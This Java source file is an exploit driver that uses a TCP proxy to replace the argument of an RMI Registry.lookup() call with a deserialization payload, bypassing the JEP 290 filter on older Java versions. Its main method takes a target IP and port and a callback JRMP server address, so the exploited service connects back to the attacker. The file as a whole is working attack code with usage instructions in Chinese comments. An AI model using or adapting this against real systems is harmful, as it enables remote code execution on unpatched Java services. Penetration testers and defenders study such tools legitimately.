
import payloads.BypassJEP290_RMIConnectionImpl_Stub;
import proxy.RMILookupExploitProxy;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.security.SecureRandom;

/***********************************************************
 * Deliver a deserialization payload to an RMI registry via
 * the Registry.bind() method.
 * 
 * Affects Java 6u131, 7u121, 8u112 and below, along with
 * JRockit R28.3.12 and below.
 * 
 * This attack works by using a TCP proxy to issue an
 * illegal call to Registry.bind() by modifying the method
 * parameters as the pass through the proxy and injecting
 * a deserialization payload.
 * 
 * Requires POP gadgets to be available on the CLASSPATH
 * of the RMI registry service.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class BypassJEP290_Lookup  {

	protected String generateRandomString() {
		SecureRandom sr = new SecureRandom();
		char[] chars = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".toCharArray();
		String out = "";
		int len;

		//Build a random string
		len = sr.nextInt(24) + 8;
		for(int i = 0; i < len; ++i) {
			out = out + chars[sr.nextInt(chars.length)];
		}

		//Return the string
		return out;
	}

	public void executeAttack_lala(String ip, int port, BypassJEP290_RMIConnectionImpl_Stub payload) throws UnknownHostException {
		RMILookupExploitProxy proxy = null;
		Registry reg;

		//Launch the attack
		try {
			//开始lookup exploit
			System.out.println("[~] Starting RMI registry proxy...");
			proxy = new RMILookupExploitProxy(InetAddress.getByName(ip), port, payload.getBytes());
			proxy.startProxy();
			System.out.println("[+] Proxy started");
			
			//获取一个RMI代理器
			System.out.println("[~] Getting proxied RMI Registry reference...");
			reg = LocateRegistry.getRegistry(proxy.getServerListenAddress().getHostAddress(), proxy.getServerListenPort());
			
			//随便给lookup传入一个参数，会在拦截器里面替换成我们的payload
			System.out.println("[~] Calling lookup(PAYLOAD)...");
			reg.lookup(this.generateRandomString());
		} catch(Exception ex) {
				;
		} finally {
			//Stop the proxy
			if(proxy != null) {
				proxy.stopProxy(true);
			}
		}
	}
	public static void main(String[] args) throws UnknownHostException {
		System.out.println("4个参数：攻击目标ip 攻击目标port 回连JRMP服务器ip 回连JRMP服务器port");
		//例子
//		BypassJEP290_RMIConnectionImpl_Stub payload = new BypassJEP290_RMIConnectionImpl_Stub("127.0.0.1",1199);
//		BypassJEP290_Lookup a= new BypassJEP290_Lookup();
//		a.executeAttack_lala("127.0.0.1",1099,payload);

		BypassJEP290_RMIConnectionImpl_Stub payload = new BypassJEP290_RMIConnectionImpl_Stub(args[2],Integer.parseInt(args[3]));
		BypassJEP290_Lookup a= new BypassJEP290_Lookup();
		a.executeAttack_lala(args[0],Integer.parseInt(args[1]),payload);
	}
}
